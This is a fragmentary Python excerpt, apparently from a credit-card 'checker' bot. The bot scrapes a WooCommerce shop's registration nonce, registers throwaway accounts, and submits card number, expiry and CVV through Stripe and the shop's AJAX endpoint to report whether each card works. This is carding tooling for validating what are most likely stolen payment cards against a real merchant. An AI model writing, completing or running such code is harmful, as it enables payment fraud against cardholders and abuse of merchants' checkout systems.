...
<b>Checking card... Please wait.</b>"""
    ...
    async def create_authenticated_session(self):
        """Create authenticated session with aiohttp - FIXED VERSION"""
        connector = None
        session = None
        ...
        try:
            ...
            try:
                async with session.get(account_url, headers=headers) as response:
                    ...
                    # Step 3: Extract nonce - SIMPLIFIED AND ACCURATE APPROACH
                    logger.step(3, 6, "Extracting nonce from page...")

                    # Save raw HTML for inspection
                    try:
                        with open("raw_account_page.html", "w", encoding="utf-8") as f:
                            f.write(account_text)
                    except:
                        pass

                    # SIMPLIFIED NONCE EXTRACTION - Look for the exact pattern
                    nonce = None

                    # Pattern 1: Look for woocommerce-register-nonce in input field
                    patterns = [
                    ...
                    # If not found, look for any hidden input with nonce
                    if not nonce:
                        hidden_inputs = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*>', account_text, re.IGNORECASE)
                        for input_tag in hidden_inputs:
                            ...
                            if name_match and value_match:
                                ...
                                # Check if it looks like a nonce
                                if 'nonce' in name and re.match(r'^[a-fA-F0-9]{8,12}$', value):
                                    nonce = value
                                    logger.success(f"Found nonce in hidden input {name}: {nonce}")
                                    break

                    # If still not found, try to find any 8-12 character hex string
                    if not nonce:
                        hex_matches = re.findall(r'\b([a-fA-F0-9]{8,12})\b', account_text)
                        for hex_str in hex_matches:
                            # Filter out likely nonces (not part of URLs, etc.)
                            if len(hex_str) in [8, 9, 10, 11, 12] and not re.search(r'[g-zG-Z]', hex_str):
                                nonce = hex_str
                                logger.warning(f"Found potential nonce via hex search: {nonce}")
                                break

                    if not nonce:
                        logger.error("Could not find any nonce on the page")
                        logger.debug_response(f"First 500 chars of page: {account_text[:500]}")

                        # Debug: Extract all form fields
                        form_fields = re.findall(r'name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']+)["\']', account_text)
                        logger.debug_response(f"Found {len(form_fields)} form fields")
                        for name, value in form_fields[:10]:
                            logger.debug_response(f"  {name}: {value}")
                    ...
                    async with session.get(add_payment_url, headers=headers) as add_response:
    ...
    async def attempt_registration(self, session, nonce, html_content):
        ...
        try:
            ...
            async with session.post(reg_url, data=reg_data, headers=headers, allow_redirects=True) as response:
        ...
        try:
            ...
            async with aiohttp.ClientSession() as stripe_session:
                async with stripe_session.post(
                    ...
                    async with session.post(ajax_url, headers=ajax_headers, data=ajax_data) as ajax_response:
                        await session.close()
            ...
            if session:
                await session.close()
            elapsed = time.time() - start_time
            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Connection failed", username, elapsed, user_data, bin_info)
        except Exception as e:
